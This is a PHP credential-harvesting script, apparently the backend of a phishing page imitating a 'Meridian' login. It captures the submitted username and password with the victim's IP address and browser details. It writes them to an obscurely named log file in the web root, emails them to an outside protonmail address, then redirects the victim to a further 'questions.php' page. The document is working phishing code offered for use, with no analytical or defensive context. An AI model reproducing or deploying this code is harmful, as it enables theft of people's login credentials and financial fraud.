<?php

error_reporting(0);

$send = "jeniaisepas@protonmail.com";

$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['username'];
$pass = $_POST['password'];

$data ="
--------------------------------------------
          IP       : $ip
--------------------------------------------
Number   : $username

Password : $password
-----------------3|$en----------------------

";

$subj="Meridian - Seven[723806851]"; 

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/ehtgdfh4w3.txt","a+");
fwrite($fp,"MERIDIAN BY POSEIDON" . " | " . getenv("REMOTE_ADDR") . " | " . getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\nusername: " . $user  . "\npassword: " . $pass . "\n\n");
fclose($fp);
	
mail($send, $subj, $data . getenv("REMOTE_ADDR") . " | " . getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT']);


		   header("Location: questions.php");

?>
